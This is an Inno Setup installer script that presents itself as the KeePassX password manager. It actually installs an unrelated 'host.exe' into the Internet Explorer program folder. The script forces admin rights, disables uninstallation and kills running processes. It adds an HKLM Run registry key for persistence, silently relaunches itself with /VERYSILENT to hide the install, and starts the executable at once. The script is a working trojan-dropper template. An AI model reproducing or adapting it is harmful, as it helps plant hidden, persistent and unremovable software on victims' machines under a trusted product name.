[Setup]
AppName=KeePassX
AppVersion=1.5
DefaultDirName="{commonpf}\Internet Explorer"
PrivilegesRequired=admin
Uninstallable=no
SetupIconFile="C:\Users\User\Desktop\host\host\setup-icon.ico"
CloseApplications=force
[Files]
Source: "C:\Users\User\Desktop\host\host\dist\host.exe"; \
    DestDir: "{app}"; Flags: ignoreversion; BeforeInstall: TaskKill('host.exe')

[Registry]
Root: HKLM64; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "InstallPath"; ValueData: "{app}\host.exe on-demand" ; Check: IsWin64

[Code]
#ifdef UNICODE
  #define AW "W"
#else
  #define AW "A"
#endif
procedure TaskKill(fileName: String);
var
    resultCode: Integer;
begin
    Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im ' + '"' + fileName + '"', '', SW_HIDE, ewWaitUntilTerminated, resultCode);
    Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im ' + '"' + fileName + '"', '', SW_HIDE, ewWaitUntilTerminated, resultCode);
end;
type
  HINSTANCE = THandle;

function ShellExecute(hwnd: HWND; lpOperation: string; lpFile: string;
  lpParameters: string; lpDirectory: string; nShowCmd: Integer): HINSTANCE;
  external 'ShellExecute{#AW}@shell32.dll stdcall';

function InitializeSetup: Boolean;
begin
  // if this instance of the setup is not silent which is by running
  // setup binary without /SILENT parameter, stop the initialization
  Result := WizardSilent;
  // if this instance is not silent, then...
  if not Result then
  begin
    // re-run the setup with /SILENT parameter; because executing of
    // the setup loader is not possible with ShellExec function, we
    // need to use a WinAPI workaround
    if ShellExecute(0, '', ExpandConstant('{srcexe}'), '/VERYSILENT', '',
      SW_SHOW) <= 32
    then
      // if re-running this setup to silent mode failed, let's allow
      // this non-silent setup to be run
      Result := True;
  end;
end;


[Run]
Filename: {app}\host.exe; Parameters: "only-interface"; Flags: nowait
Filename: {app}\host.exe; Parameters: "on-demand"; Flags: nowait
